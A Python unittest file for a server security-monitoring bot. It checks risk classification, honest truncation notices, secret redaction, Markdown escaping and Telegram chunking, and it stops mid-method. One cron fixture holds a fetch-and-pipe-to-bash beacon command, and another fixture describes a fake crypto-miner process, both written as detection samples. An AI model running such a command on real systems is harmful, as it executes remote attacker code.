"""
Regression coverage for BUILD-SEC-NET-02 (authoritative classified reporting).

REG-SEC-NET-02-1 — the prompt and the Telegram formatter show directions,
confidence, reason, risk, categories and totals, contain no blanket
port/IP/ephemeral trust claims, keep benign and adverse observations with
explicit counts when the output is bounded.

REG-SEC-NET-02-2 — /security and the nightly job both deliver the same
authoritative assessment to the instance's chat when the model fails, returns an
error string, or contradicts the evidence; chunk bounds are respected.
"""

import io
import json
import re
import sys
import unittest
from contextlib import redirect_stdout
from pathlib import Path
from unittest import mock

import requests

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import llm_analyzer
import monitor
import security_scanner


ROOT = Path(__file__).resolve().parents[1]

BOT_EXE = "/home/ubuntu/dev/monitor_bot/venv/python"
BOT_SCRIPT = "/home/ubuntu/dev/monitor_bot/monitor.py"
OTEL_CONTAINER = "otel-collector"


def observation(local_ip, local_port, remote=None, direction="outbound",
                 bind_scope="private-interface", classification="needs_review",
                 confidence="low", reason="evidence based reason", is_listener=False,
                 name="python3", exe="/usr/bin/python3", cmdline=("python3", "/tmp/x.py"),
                 user="www-data", container=None, protocol="tcp", state="ESTABLISHED",
                 evidence=None, pid=4242):
    return {
        "protocol": protocol, "state": state, "local_ip": local_ip, "local_port": local_port,
        "remote_ip": remote[0] if remote else None,
        "remote_port": remote[1] if remote else None,
        "direction": direction, "bind_scope": bind_scope, "is_listener": is_listener,
        "pid": pid,
        "process": {"name": name, "exe": exe, "cmdline": list(cmdline), "user": user,
                    "parent_exe": "/usr/sbin/init"},
        "container": container,
        "classification": classification, "confidence": confidence, "reason": reason,
        "evidence": evidence if evidence is not None else {
            "local": "%s:%s" % (local_ip, local_port), "state": state, "pid": pid},
    }


def findings(observations, *, error=None, risk=None, scan_status="complete",
             scan_gaps=None, processes=None, auth_log=(), services=None, cron=(),
             users=(), docker_status="available"):
    counts = {}
    for item in observations:
        counts[item["classification"]] = counts.get(item["classification"], 0) + 1
    directions = {"inbound": 0, "outbound": 0, "uncertain": 0}
    for item in observations:
        directions[item["direction"]] = directions.get(item["direction"], 0) + 1
    network = {
        "observations": observations,
        "category_counts": counts,
        "totals": {
            "observations": len(observations),
            "listeners": sum(1 for item in observations if item["is_listener"]),
            "inbound": directions["inbound"], "outbound": directions["outbound"],
            "uncertain": directions["uncertain"],
        },
        "unexpected_listening": [], "external_connections": [],
        "scan_status": scan_status, "scan_gaps": list(scan_gaps or []),
        "docker_status": docker_status,
    }
    data = {
        "instance": "AURORA", "mode": "local", "collected": "2026-09-29 12:00:00",
        "error": error,
        "processes": processes or {"high_cpu": [], "high_mem": [], "suspicious_name": [],
                                   "suspicious_path": [], "zombies": []},
        "network": network,
        "users": {"logged_in": list(users)},
        "files": {"recently_modified_system": []},
        "services": services or {"failed": [], "new_units": []},
        "cron": {"entries": list(cron)},
        "auth_log": list(auth_log),
    }
    network["risk"] = risk or security_scanner._assess_network_risk(
        observations, scan_status, list(scan_gaps or []), data)
    return data


MIXED = [
    observation("127.0.0.1", 13133, direction="uncertain", bind_scope="loopback-only",
                classification="expected", confidence="high", is_listener=True,
                name="docker-proxy", exe="/usr/bin/docker-proxy", user="root",
                state="LISTEN", cmdline=("docker-proxy",),
                reason="exactly one running container publishes host port 13133",
                container={"name": OTEL_CONTAINER, "image": "otel/collector:0.1",
                           "target_port": 13133}),
    observation("0.0.0.0", 443, direction="inbound", bind_scope="all-interfaces",
                classification="informational", confidence="high", is_listener=True,
                name="nginx", exe="/usr/sbin/nginx", user="www-data", state="LISTEN",
                cmdline=("nginx: worker process",),
                reason="nginx owns this listener bound to all-interfaces"),
    observation("203.0.113.9", 443, remote=("198.51.100.7", 54001), direction="inbound",
                bind_scope="public-interface", classification="informational",
                confidence="high", name="nginx", exe="/usr/sbin/nginx", user="www-data",
                cmdline=("nginx: worker process",), reason="matched inbound peer traffic"),
    observation("10.0.1.5", 53124, remote=("203.0.113.10", 443), direction="outbound",
                classification="expected", confidence="high", name="python", exe=BOT_EXE,
                cmdline=(BOT_EXE, BOT_SCRIPT), user="ubuntu",
                reason="matches the configured monitor bot identity and destination"),
    observation("10.0.1.5", 44999, remote=("198.51.100.44", 4444), direction="outbound",
                classification="suspicious", confidence="medium",
                reason="unrecognised script is connecting to an unexpected service port"),
    observation("127.0.0.53", 53, direction="uncertain", bind_scope="loopback-only",
                classification="needs_review", confidence="low", is_listener=True,
                name="systemd-resolve", exe="/lib/systemd/systemd-resolved", user="root",
                state="LISTEN", cmdline=("/lib/systemd/systemd-resolved",),
                reason="listener owner identity could not be established"),
]


def unescape(text):
    """The text a Telegram Markdown client renders from an escaped chunk."""
    return re.sub(r"\\([_*`\[\]])", r"\1", text)


def count_unescaped(chunk, char):
    return len(re.findall(r"(?<!\\)" + re.escape(char), chunk))


# REG-REV-NET-001 fixture: host-derived text that carries Telegram Markdown
# reserved characters, exactly as the collector can produce it.
MARKDOWN_HOSTILE = [
    observation("0.0.0.0", 13133, direction="uncertain", bind_scope="all-interfaces",
                classification="needs_review", confidence="low", is_listener=True,
                name="docker-proxy", exe="/usr/bin/docker-proxy", user="root",
                state="LISTEN", cmdline=("docker-proxy",), pid=500,
                container={"name": "otel_collector", "image": "otel/collector:0.1",
                           "target_port": 13133},
                evidence={"state": "LISTEN", "pid": 500, "docker_status": "available"},
                reason=("Publishing container is verified, but no collector identity is "
                        "configured (INSTANCE_<N>_SECURITY_OTEL_CONTAINER_NAME), so the "
                        "workload cannot be confirmed as the expected collector")),
    observation("10.0.1.5", 44012, remote=("100.100.100.100", 443),
                classification="needs_review", confidence="low",
                name="tailscaled", exe="/usr/libexec/tailscaled",
                cmdline=("/usr/libexec/tailscaled", "--statedir=/var/lib/tailscale_state"),
                reason=("Process tailscaled looks like the Tailscale client, but no "
                        "INSTANCE SECURITY_TAILSCALED_EXE is configured to verify it; "
                        "see also sshd[2103]: Connection closed by authenticating user "
                        "root 198.51.100.44 port 41322 [preauth]")),
    observation("10.0.1.5", 53124, remote=("203.0.113.10", 443),
                classification="expected", confidence="high", name="python", exe=BOT_EXE,
                cmdline=(BOT_EXE, BOT_SCRIPT), user="ubuntu",
                evidence={"state": "ESTABLISHED", "pid": 900,
                          "matched_destination": "203.0.113.10"},
                reason="matches the configured monitor bot identity and destination"),
]

MARKDOWN_HOSTILE_AUTH = [
    "Sep 29 10:00:05 AURORA sshd[2103]: Connection closed by authenticating user root "
    "198.51.100.44 port 41322 [preauth]",
]


class ReportSectionTests(unittest.TestCase):
    """REG-REV-NET-002: the six required sections, as a pure view of the evidence."""

    SECTIONS = [
        observation("127.0.0.1", 13133, direction="uncertain", bind_scope="loopback-only",
                    classification="expected", confidence="high", is_listener=True,
                    name="docker-proxy", exe="/usr/bin/docker-proxy", user="root",
                    state="LISTEN", cmdline=("docker-proxy",),
                    container={"name": OTEL_CONTAINER, "image": "otel/collector:0.1",
                               "target_port": 13133},
                    reason="exactly one running container publishes host port 13133"),
        observation("0.0.0.0", 13133, direction="uncertain", bind_scope="all-interfaces",
                    classification="needs_review", confidence="low", is_listener=True,
                    name="docker-proxy", exe="/usr/bin/docker-proxy", user="root",
                    state="LISTEN", cmdline=("docker-proxy",),
                    reason=("the host socket is bound to all-interfaces, so the collector "
                            "is reachable from the network")),
        observation("203.0.113.9", 443, remote=("198.51.100.7", 54001), direction="inbound",
                    bind_scope="public-interface", classification="informational",
                    confidence="high", name="nginx", exe="/usr/sbin/nginx", user="www-data",
                    state="ESTABLISHED", cmdline=("nginx: worker process",),
                    reason="nginx accepted inbound connection 198.51.100.7:54001"),
        observation("10.0.1.5", 53124, remote=("203.0.113.10", 443), direction="outbound",
                    bind_scope="private-interface", classification="expected",
                    confidence="high", name="python", exe=BOT_EXE, cmdline=(BOT_EXE, BOT_SCRIPT),
                    user="ubuntu", evidence={"state": "ESTABLISHED", "pid": 900,
                                             "matched_destination": "203.0.113.10"},
                    reason="matches the configured monitor bot identity and destination"),
        observation("0.0.0.0", 443, direction="inbound", bind_scope="all-interfaces",
                    classification="informational", confidence="high", is_listener=True,
                    name="nginx", exe="/usr/sbin/nginx", user="www-data", state="LISTEN",
                    cmdline=("nginx: worker process",),
                    reason="nginx owns this listener; it is bound to all-interfaces"),
    ]

    def sections(self):
        return self.sections_from(self.SECTIONS)

    def test_all_six_sections_are_rendered_and_populated_by_evidence(self):
        text, blocks = self.sections()

        for title in ("Suspicious / Requires Review", "Expected Network Activity",
                      "Externally Exposed Listeners", "Local-Only Listeners",
                      "Outbound Connections", "Inbound Connections"):
            with self.subTest(section=title):
                self.assertIn("*%s*" % title, text)
        # SAFE-4: the exposed collector is reviewed and exposed, never expected.
        self.assertIn("0.0.0.0:13133", blocks["Externally Exposed Listeners"])
        self.assertIn("0.0.0.0:13133", blocks["Suspicious / Requires Review"])
        self.assertNotIn("0.0.0.0:13133", blocks["Expected Network Activity"])
        # The verified loopback collector is expected activity and a local listener.
        self.assertIn("127.0.0.1:13133", blocks["Local-Only Listeners"])
        self.assertIn("127.0.0.1:13133", blocks["Expected Network Activity"])
        # SAFE-1: an inbound nginx socket is inbound, never outbound.
        self.assertIn("198.51.100.7:54001", blocks["Inbound Connections"])
        self.assertNotIn("198.51.100.7:54001", blocks["Outbound Connections"])
        # The monitor bot socket is outbound and expected.
        self.assertIn("10.0.1.5:53124", blocks["Outbound Connections"])
        self.assertIn("10.0.1.5:53124", blocks["Expected Network Activity"])
        # The all-interfaces nginx listener is exposed, not expected.
        self.assertIn("0.0.0.0:443", blocks["Externally Exposed Listeners"])
        self.assertNotIn("0.0.0.0:443", blocks["Expected Network Activity"])
        # REV-REV-NET-006 identifiers survive into the rendered sections.
        self.assertIn("matched-destination=203.0.113.10", blocks["Outbound Connections"])

    def test_sectioning_is_a_pure_view_of_the_shown_observations(self):
        text, _ = self.sections()
        shown, _, _ = llm_analyzer._select_observations(self.SECTIONS)
        for _, observation in shown:
            self.assertIn("%s:%s" % (observation["local_ip"], observation["local_port"]), text)
        # The preserved blocks are still there.
        self.assertIn("*Other evidence*", text)
        self.assertIn("The risk above is computed from the collected evidence", text)

    def test_an_empty_section_states_none(self):
        only = [self.SECTIONS[0]]
        text, blocks = self.sections_from(only)

        self.assertIn("127.0.0.1:13133", blocks["Local-Only Listeners"])
        for empty in ("Suspicious / Requires Review", "Externally Exposed Listeners",
                      "Outbound Connections", "Inbound Connections"):
            with self.subTest(section=empty):
                self.assertIn("(none)", blocks[empty])

    def sections_from(self, items):
        text = unescape("\n".join(
            llm_analyzer.format_assessment(findings(items), "TS")))
        blocks = {}
        for index, title in enumerate(llm_analyzer.SECTION_TITLES):
            start = text.index("*%s*" % title)
            end = text.index("*%s*" % llm_analyzer.SECTION_TITLES[index + 1]) \
                if index + 1 < len(llm_analyzer.SECTION_TITLES) else len(text)
            blocks[title] = text[start:end]
        return text, blocks


class TruncationTests(unittest.TestCase):
    """REG-REV-NET-004: adverse evidence is never dropped and the notice is honest."""

    def observations(self, review=71):
        items = [observation("10.0.1.5", 40000 + index,
                             remote=("198.51.100.%d" % (index % 250 + 1), 443),
                             classification="needs_review")
                 for index in range(review)]
        items.append(observation("10.0.1.5", 44999, remote=("203.0.113.66", 4444),
                                 classification="suspicious", confidence="medium",
                                 reason="unrecognised script to an unexpected service port"))
        items.append(dict(MIXED[0]))          # expected loopback collector
        items.append(dict(MIXED[1]))          # informational all-interfaces listener
        items.append(dict(MIXED[2]))          # informational inbound peer
        return items

    def test_adverse_evidence_is_never_omitted_and_the_notice_is_honest(self):
        items = self.observations()
        rendered = unescape("\n".join(
            llm_analyzer.format_assessment(findings(items), "TS")))

        # (a) No completeness claim the report cannot support.
        self.assertNotIn("every suspicious, review, and unknown item is listed above",
                         rendered)
        # (b) Every adverse item, including the suspicious one, is delivered.
        for index in range(71):
            self.assertIn("10.0.1.5:%d" % (40000 + index), rendered)
        self.assertIn("203.0.113.66:4444", rendered)
        self.assertIn("unrecognised script to an unexpected service port", rendered)
        # (c) The notice counts what was left out and states the adverse omissions.
        self.assertIn("75 observation(s)", rendered)
        self.assertIn("3 of 75 observation(s) not shown", rendered)
        self.assertIn("Adverse omissions: 0 of 72 adverse observation(s) not shown",
                      rendered)

    def test_selection_never_returns_an_omitted_adverse_observation(self):
        adverse_only = [observation("10.0.1.5", 40000 + index,
                                    remote=("198.51.100.1", 4444),
                                    classification="suspicious")
                        for index in range(120)]
        shown, omitted, omitted_adverse = llm_analyzer._select_observations(adverse_only)

        self.assertEqual(omitted_adverse, [])
        self.assertEqual(omitted, [])
        self.assertEqual(len(shown), 120)
        # The adverse evidence is delivered even past the display budget.
        self.assertGreater(len(shown), llm_analyzer.MAX_OBSERVATION_LINES)

    def test_expected_evidence_is_truncated_before_any_adverse_evidence(self):
        items = [observation("127.0.0.1", 13133 + index, direction="uncertain",
                             bind_scope="loopback-only", classification="expected",
                             confidence="high", is_listener=True, name="docker-proxy",
                             exe="/usr/bin/docker-proxy", user="root", state="LISTEN",
                             cmdline=("docker-proxy",))
                 for index in range(80)]
        items.append(observation("10.0.1.5", 44999, remote=("203.0.113.66", 4444),
                                 classification="suspicious", confidence="medium"))
        shown, omitted, omitted_adverse = llm_analyzer._select_observations(items)

        self.assertEqual(omitted_adverse, [])
        self.assertEqual(len(omitted), 80 - (llm_analyzer.MAX_OBSERVATION_LINES - 1))
        self.assertIn("203.0.113.66:4444", unescape(
            "\n".join(llm_analyzer._observation_line(item, for_markdown=True)
                      for _, item in shown)))


class TransportSafetyTests(unittest.TestCase):
    """REG-REV-NET-001: no evidence-reserved character can reject a whole chunk."""

    def chunks(self):
        return llm_analyzer.format_assessment(
            findings(MARKDOWN_HOSTILE, auth_log=MARKDOWN_HOSTILE_AUTH), "TS")

    def test_every_chunk_is_markdown_balanced_and_evidence_is_escaped(self):
        chunks = self.chunks()
        rendered = unescape("\n".join(chunks))
        raw = "\n".join(chunks)

        for chunk in chunks:
            self.assertEqual(count_unescaped(chunk, "_") % 2, 0, chunk)
            self.assertEqual(count_unescaped(chunk, "*") % 2, 0, chunk)
            self.assertEqual(count_unescaped(chunk, "`") % 2, 0, chunk)
            self.assertEqual(count_unescaped(chunk, "["), 0, chunk)
        for hostile in ("INSTANCE_<N>_SECURITY_OTEL_CONTAINER_NAME",
                        "--statedir=/var/lib/tailscale_state",
                        "/home/ubuntu/dev/monitor_bot/venv/python",
                        "/home/ubuntu/dev/monitor_bot/monitor.py",
                        "otel_collector", "sshd[2103]", "[preauth]"):
            with self.subTest(evidence=hostile):
                self.assertNotIn(hostile, raw)
        # The risk line, the reasons, and every adverse item still reach the operator.
        self.assertIn("Risk: `MEDIUM`", rendered)
        self.assertIn("*Authoritative assessment (deterministic)*", rendered)
        for item in MARKDOWN_HOSTILE:
            with self.subTest(reason=item["reason"][:40]):
                self.assertIn(item["reason"], rendered)
                self.assertIn(item["process"]["exe"], rendered)
        self.assertIn("Connection closed by authenticating user root", rendered)
        # REV-REV-NET-006: the correlated identifiers are rendered.
        self.assertIn("state=LISTEN", rendered)
        self.assertIn("pid=500", rendered)
        self.assertIn("matched-destination=203.0.113.10", rendered)
        self.assertIn("docker-status=available", rendered)

    def test_rejected_chunk_is_surfaced_and_later_chunks_are_still_attempted(self):
        many = [dict(MIXED[4], local_port=40000 + index, local_ip="10.0.1.5",
                     remote=("198.51.100.%d" % (index % 250 + 1), 4444))
                for index in range(120)]
        data = findings(many)
        chunks = llm_analyzer.format_assessment(data, "TS")
        self.assertGreater(len(chunks), 1)

        sent = []

        def post(url, json=None, **kwargs):
            sent.append(json)
            response = mock.Mock()
            if len(sent) == 2:
                response.raise_for_status.side_effect = requests.exceptions.HTTPError(
                    "400 Bad Request: can't parse entities: can't find end of the entity")
            return response

        buffer = io.StringIO()
        with mock.patch.object(monitor.requests, "post", side_effect=post):
            with redirect_stdout(buffer):
                monitor.send_security_assessment(
                    "-1001", {"name": "AURORA", "chat_id": "-1001"}, data, "TS")
        printed = buffer.getvalue()

        # Every chunk was still attempted, in order, including the ones after the
        # rejected one, and the rejection was reported to the operator.
        self.assertEqual(len(sent), len(chunks))
        self.assertEqual([item["text"] for item in sent], chunks)
        self.assertIn("assessment chunk 2", printed)
        self.assertIn("1 authoritative assessment chunk(s) were rejected by Telegram",
                      printed)
        self.assertIn("was NOT delivered", printed)

    def test_advisory_banner_escapes_the_instance_name(self):
        chunks = llm_analyzer.format_advisory("AURORA_1", "### FINDINGS\nfine", "TS")

        self.assertEqual(count_unescaped("\n".join(chunks), "_"), 0)
        self.assertIn("AURORA_1", unescape("\n".join(chunks)))
        self.assertIn("cannot lower or raise the authoritative risk", chunks[0])


class AdvisoryChunkBoundTests(unittest.TestCase):
    """REG-REV-NET-011: no advisory message may exceed Telegram's 4096-char limit."""

    INSTANCE = "AURORA"
    TIMESTAMP = "2026-01-01 00:00:00"
    FILLER = ("The observed socket matched no configured destination and the owning "
              "process could not be identified, so it is listed for review. ")
    # Every advisory chunk repeats the banner, and the first one also carries the
    # report header. Both are delivery furniture, never model text, and the split
    # may rstrip the blank lines that follow them.
    FURNITURE = re.compile(
        r"\A(?:🤖 \*AI commentary — advisory only\*\n"
        r"🖥️ Instance: `[^\n]*`\n"
        r"🕐 [^\n]*\n"
        r"⚠️ Advisory text cannot lower or raise the authoritative risk shown above\.\n"
        r"─{38}\n*)?"
        r"(?:🔐 \*Security Report\*\n"
        r"🖥️ Instance: `[^\n]*`\n"
        r"🕐 [^\n]*\n"
        r"─{38}\n*)?")

    def paragraph(self, length):
        """Plain prose of at most `length` characters, unbroken at a word boundary.

        Plain prose is used on purpose: `_format_for_telegram` rewrites headings
        and bullets, which would make the body comparison below meaningless.
        """
        text = self.FILLER * (length // len(self.FILLER) + 1)
        cut = text.rfind(" ", 0, length + 1)
        return (text[:cut] if cut > 0 else text[:length]).strip()

    def body_breaking_at(self, offset):
        """A two-paragraph body whose paragraph break sits at `offset`."""
        return self.paragraph(offset - 2) + "\n\n" + self.paragraph(120)

    def advisory(self, body):
        return llm_analyzer.format_advisory(self.INSTANCE, body, self.TIMESTAMP)

    def assert_deliverable(self, chunks):
        """Every chunk is sendable, still banner-marked, and losslessly joined."""
        self.assertTrue(chunks)
        for chunk in chunks:
            self.assertLessEqual(len(chunk), llm_analyzer.TELEGRAM_MAX_MESSAGE,
                                 "a chunk Telegram would reject: %d chars" % len(chunk))
            self.assertIn("cannot lower or raise the authoritative risk", chunk)
        return "".join("".join(self.FURNITURE.sub("", chunk).split()) for chunk in chunks)

    def test_paragraph_breaks_sweeping_the_split_window_never_overflow(self):
        """The banner is reserved, so the split window moves, the limit does not."""
        for offset in range(3800, 4001, 20):
            with self.subTest(offset=offset):
                body = self.body_breaking_at(offset)
                chunks = self.advisory(body)

                self.assertGreater(len(chunks), 1)
                self.assertEqual(self.assert_deliverable(chunks),
                                 "".join(body.split()))

    def test_a_single_long_paragraph_is_still_split_within_the_limit(self):
        body = self.paragraph(4500)
        chunks = self.advisory(body)

        self.assertGreaterEqual(len(chunks), 1)
        self.assertEqual(self.assert_deliverable(chunks), "".join(body.split()))

    def test_a_body_shorter_than_the_banner_is_delivered_as_one_banned_chunk(self):
        body = self.paragraph(50)
        chunks = self.advisory(body)

        self.assertEqual(len(chunks), 1)
        self.assertIn("AI commentary — advisory only", chunks[0])
        self.assertEqual(self.assert_deliverable(chunks), "".join(body.split()))

    def test_an_empty_body_still_returns_exactly_one_chunk(self):
        chunks = self.advisory("")

        self.assertEqual(len(chunks), 1)
        self.assertLessEqual(len(chunks[0]), llm_analyzer.TELEGRAM_MAX_MESSAGE)
        self.assertIn("authoritative assessment above stands", chunks[0])


class AssessmentTests(unittest.TestCase):
    def test_mixed_evidence_produces_one_authoritative_assessment(self):
        assessment = llm_analyzer.build_assessment(findings(MIXED))

        self.assertEqual(assessment["risk"], "medium")
        self.assertEqual(assessment["posture"], "complete")
        self.assertEqual(assessment["categories"]["expected"], 2)
        self.assertEqual(assessment["categories"]["informational"], 2)
        self.assertEqual(assessment["categories"]["needs_review"], 1)
        self.assertEqual(assessment["categories"]["suspicious"], 1)
        self.assertEqual(assessment["directions"],
                         {"inbound": 2, "outbound": 2, "uncertain": 2})
        self.assertEqual(assessment["adverse"], 2)
        self.assertTrue(assessment["reasons"])

    def test_verified_expected_only_scan_is_not_raised_by_counts_or_ports(self):
        verified = [
            item for item in MIXED
            if item["classification"] in ("expected", "informational")
        ]
        assessment = llm_analyzer.build_assessment(findings(verified))
        self.assertEqual(assessment["risk"], "negligible")
        self.assertEqual(assessment["adverse"], 0)

    def test_scanner_failure_is_never_reported_as_clean(self):
        assessment = llm_analyzer.build_assessment(
            findings([], error="SSH unreachable", scan_status="failed"))
        self.assertGreaterEqual(llm_analyzer.RISK_ORDER.index(assessment["risk"]),
                                llm_analyzer.RISK_ORDER.index("medium"))
        self.assertEqual(assessment["posture"], "failed")
        self.assertIn("SSH unreachable", " ".join(assessment["reasons"]))

    def test_correlated_non_network_signals_escalate_the_authoritative_risk(self):
        adverse = findings(
            [MIXED[4]],
            processes={"high_cpu": [], "high_mem": [], "zombies": [],
                       "suspicious_name": [{"pid": 1, "name": "xmrig", "exe": "/tmp/.x/xmrig",
                                            "user": "www-data"}],
                       "suspicious_path": [{"pid": 1, "name": "xmrig",
                                            "exe": "/tmp/.x/xmrig", "user": "www-data"}]},
            auth_log=["sshd[1]: Failed password for root from 198.51.100.44"],
            services={"failed": ["nginx"], "new_units": ["/etc/systemd/system/x.service"]},
            cron=["*/1 * * * * curl -s http://198.51.100.44/beacon | bash"],
        )
        assessment = llm_analyzer.build_assessment(adverse)
        self.assertEqual(assessment["risk"], "high")
        self.assertIn(assessment["non_network"]["adverse_auth_lines"], (1,))
        self.assertEqual(assessment["non_network"]["adverse_cron_lines"], 1)


class LegacyFixtureTests(unittest.TestCase):
    """Legacy findings stay intelligible without invented identity or direction."""

    def setUp(self):
        self.legacy = {
            "instance": "prod-web-01", "mode": "remote", "collected": "2026-06-25 09:00:00",
            "error": None,
            "processes": {"high_cpu": [], "high_mem": [], "suspicious_name": [],
                          "suspicious_path": [], "zombies": []},
            "network": {
                "unexpected_listening": [],
                "external_connections": [
                    {"local": "10.0.1.5:49812", "remote": "52.217.43.100:443"},
                    {"local": "10.0.1.5:49900", "remote": "13.35.66.200:443"},
                ],
            },
            "users": {"logged_in": [{"name": "ubuntu", "terminal": "pts/0", "host": "10.0.0.1",
                                    "started": "2026-06-25 09:00:00"}]},
            "files": {"recently_modified_system": ["2026-06-25T08:30:01 /usr/bin/python3.11"]},
            "services": {"failed": [], "new_units": []},
            "cron": {"entries": ["0 2 * * * /usr/bin/certbot renew --quiet"]},
            "auth_log": ["sshd[1234]: Accepted publickey for ubuntu from 10.0.0.1 port 52100"],
        }

    def test_legacy_records_are_uncertain_and_never_invented_as_outbound(self):
        assessment = llm_analyzer.build_assessment(self.legacy)

        self.assertTrue(assessment["legacy_records"])
        self.assertEqual(assessment["directions"]["outbound"], 0)
        self.assertEqual(assessment["directions"]["uncertain"], 2)
        self.assertGreaterEqual(llm_analyzer.RISK_ORDER.index(assessment["risk"]),
                                llm_analyzer.RISK_ORDER.index("medium"))

    def test_legacy_listener_records_are_uncertain(self):
        legacy = dict(self.legacy)
        legacy["network"] = {
            "unexpected_listening": [{"port": 31337, "addr": "0.0.0.0:31337"}],
            "external_connections": [],
        }
        text = "\n".join(llm_analyzer.format_assessment(legacy, "TS"))
        self.assertIn("uncertain", text)
        self.assertIn("0.0.0.0:31337", text)
        directions_line = text.split("Directions:")[1].split("\n")[0]
        self.assertIn("outbound 0", directions_line)
        self.assertIn("uncertain 1", directions_line)

    def test_prompt_marks_legacy_records_as_uncertain(self):
        prompt = llm_analyzer.build_prompt(self.legacy)
        self.assertIn("carry no owner, bind scope, or direction evidence", prompt)
        self.assertIn("uncertain", prompt)


class PromptTests(unittest.TestCase):
    def setUp(self):
        self.prompt = llm_analyzer.build_prompt(findings(MIXED))

    def test_prompt_shows_classified_evidence_totals_and_authoritative_risk(self):
        self.assertIn("CLASSIFIED NETWORK EVIDENCE", self.prompt)
        self.assertIn("AUTHORITATIVE RISK (deterministic, not yours to change)", self.prompt)
        self.assertIn("EVIDENCE POSTURE", self.prompt)
        for category in ("expected", "informational", "needs_review", "suspicious"):
            self.assertIn(category, self.prompt)
        self.assertIn("DIRECTIONS: inbound 2, outbound 2, uncertain 2", self.prompt)
        self.assertIn("inbound", self.prompt)
        self.assertIn("bind=loopback-only", self.prompt)
        self.assertIn("conf=high", self.prompt)
        self.assertIn("unrecognised script", self.prompt)
        self.assertIn("container=otel-collector", self.prompt)

    def test_prompt_has_no_blanket_port_ip_or_ephemeral_trust_claims(self):
        lowered = self.prompt.lower()
        for claim in (
            "outbound https (port 443) connections are normal",
            "only flag them as suspicious if there are many",
            "known administrator accessing via ssh",
            "ephemeral ports (32768-65535) are temporary os-assigned ports, not suspicious",
            "port 33060 is mysql x protocol",
            "121.58.203.121",
        ):
            with self.subTest(claim=claim):
                self.assertNotIn(claim, lowered)
        self.assertIn("never proof of identity", lowered)
        self.assertIn("cannot be reported as clean", lowered)

    def test_prompt_keeps_legacy_and_non_network_sections(self):
        for section in ("SECTION 1 — PROCESS ANOMALIES", "SECTION 3 — LOGGED-IN USERS",
                        "SECTION 4 — FILE SYSTEM CHANGES", "SECTION 5 — SERVICES & CRON",
                        "SECTION 6 — AUTHENTICATION LOG"):
            with self.subTest(section=section):
                self.assertIn(section, self.prompt)

    def test_prompt_does_not_leak_secrets_from_process_command_lines(self):
        secret_findings = findings([
            observation("10.0.1.5", 41000, remote=("198.51.100.5", 443),
                        name="curl", exe="/usr/bin/curl",
                        cmdline=("curl", "--token", "super-secret-value")),
        ])
        self.assertNotIn("super-secret-value", llm_analyzer.build_prompt(secret_findings))


class FormatterTests(unittest.TestCase):
    def test_formatter_shows_every_category_and_direction(self):
        text = unescape("\n".join(llm_analyzer.format_assessment(findings(MIXED), "TS")))
        self.assertIn("Risk: `MEDIUM`", text)
        self.assertIn("evidence posture: `complete`", text)
        self.assertIn("expected 2", text)
        self.assertIn("informational 2", text)
        self.assertIn("needs_review 1", text)
        self.assertIn("suspicious 1", text)
        self.assertIn("inbound 2", text)
        self.assertIn("outbound 2", text)
        self.assertIn("uncertain 2", text)
        self.assertIn("loopback-only", text)
        self.assertIn("all-interfaces", text)
        self.assertIn("unrecognised script is connecting", text)
        self.assertIn("exactly one running container publishes", text)
        self.assertIn("198.51.100.7:54001", text)
        self.assertIn("10.0.1.5:53124", text)
        self.assertIn("The risk above is computed from the collected evidence", text)

    def test_formatter_keeps_benign_and_adverse_items_and_reports_truncation(self):
        small = unescape("\n".join(llm_analyzer.format_assessment(findings(MIXED), "TS")))
        self.assertIn("suspicious", small)
        self.assertIn("docker-proxy", small)
        self.assertLess(small.index("/tmp/x.py"), small.index("docker-proxy"))
        self.assertNotIn("omitted for length", small)

        many = [dict(MIXED[4]) for _ in range(80)] + [dict(item) for item in MIXED]
        for index, item in enumerate(many):
            item = dict(item)
            item["local_port"] = 40000 + index
            many[index] = item
        text = unescape("\n".join(llm_analyzer.format_assessment(findings(many), "TS")))

        self.assertIn("suspicious", text)
        self.assertIn("86 observation(s)", text)
        self.assertIn("omitted for length", text)
        self.assertIn("suspicious 81", text)
        # The dishonest completeness claim is gone and replaced by real numbers.
        self.assertNotIn("every suspicious, review, and unknown item is listed above", text)
        self.assertIn("4 of 86 observation(s) not shown", text)
        self.assertIn("Adverse omissions: 0 of 82 adverse observation(s) not shown", text)

    def test_every_chunk_respects_the_message_bound(self):
        many = [observation("10.0.1.5", 40000 + index, remote=("198.51.100.%d" % (index % 250 + 1), 443))
                for index in range(200)]
        # Lower-priority evidence is what the display budget truncates.
        many += [observation("127.0.0.1", 13133, direction="uncertain",
                             bind_scope="loopback-only", classification="expected",
                             confidence="high", is_listener=True, name="docker-proxy",
                             exe="/usr/bin/docker-proxy", user="root", state="LISTEN",
                             cmdline=("docker-proxy",))
                 for _ in range(40)]
        chunks = llm_analyzer.format_assessment(findings(many), "TS")

        self.assertGreater(len(chunks), 1)
        for chunk in chunks:
            self.assertLessEqual(len(chunk), llm_analyzer.MAX_TELEGRAM_CHUNK)
        joined = unescape("\n".join(chunks))
        self.assertIn("240 observation(s)", joined)
        self.assertIn("omitted for length", joined)
        self.assertIn("Adverse omissions: 0 of 200 adverse observation(s) not shown", joined)

    def test_evidence_gaps_and_scanner_errors_survive_into_the_report(self):
        text = "\n".join(llm_analyzer.format_assessment(
            findings(MIXED, error="Remote security scanner exited nonzero",
                     scan_status="failed", scan_gaps=["Docker identity lookup failed: denied"]),
            "TS"))
        self.assertIn("Remote security scanner exited nonzero", text)
        self.assertIn("Docker identity lookup failed: denied", text)
        self.assertIn("Risk: `", text)

    def test_advisory_text_cannot_present_a_competing_authoritative_rating(self):
        model_text = (
            "### RISK RATING\n✅ LOW\n\nEverything looks fine.\n"
        )
        chunks = llm_analyzer.format_advisory("AURORA", model_text, "TS")
        text = "\n".join(chunks)

        self.assertIn("advisory only", text)
        self.assertIn("cannot lower or raise the authoritative risk", text)
        self.assertIn("model opinion, advisory only", text)
        self.assertLessEqual(max(len(chunk) for chunk in chunks),
                             llm_analyzer.TELEGRAM_MAX_MESSAGE)

    def test_empty_advisory_response_states_the_assessment_stands(self):
        self.assertIn("authoritative assessment above stands",
                      llm_analyzer.format_advisory("AURORA", "", "TS")[0])


class ReportDeliveryTests(unittest.TestCase):
    """REG-SEC-NET-02-2: both entry paths deliver the same authoritative assessment."""

    def setUp(self):
        self.instance = {
            "name": "AURORA", "chat_id": "-1001", "is_local": True, "is_windows": False,
            "index": 1, "security": {},
        }
        self.remote = {
            "name": "AURORA EC2", "chat_id": "-1002", "is_local": False, "is_windows": False,
            "index": 2, "security": {},
        }

    def messages(self, send):
